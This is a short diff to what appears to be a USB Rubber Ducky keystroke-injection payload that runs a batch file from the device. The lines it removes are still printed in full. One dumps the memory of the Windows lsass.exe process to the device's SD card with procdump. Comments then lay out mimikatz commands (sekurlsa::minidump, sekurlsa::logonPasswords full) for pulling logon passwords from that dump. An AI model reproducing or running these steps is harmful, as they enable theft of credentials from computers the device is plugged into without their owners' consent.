@@ -40,18 +40,6 @@ STRING %DUCKYdrive%\launch.bat
 ENTER
 DELAY 200
 
-REM *** Execute procdump from SD card and save log file to disk ***
-STRING %duck%\procdump.exe -accepteula -ma lsass.exe %duck%\Tools\%COMPUTERNAME%_lsass.dmp 
-ENTER
-
-REM *** GTFO ***
+REM *** The END ***
 STRING exit
 ENTER
-
-REM *** Post Exploitation ***
-REM From your PC copy the %COMPUTERNAME%_lsass.dmp off the DUCKY SD card to a 
-REM directory including the version of mimikatz for your targets architecture
-REM (NT5 win32, NT5 x64, NT6 win32 or NT6 x64) and run the following commands
-REM mimikatz.exe <enter>
-REM sekurlsa::minidump %COMPUTERNAME%_lsass.dmp <enter>
-REM sekurlsa::logonPasswords full <enter>
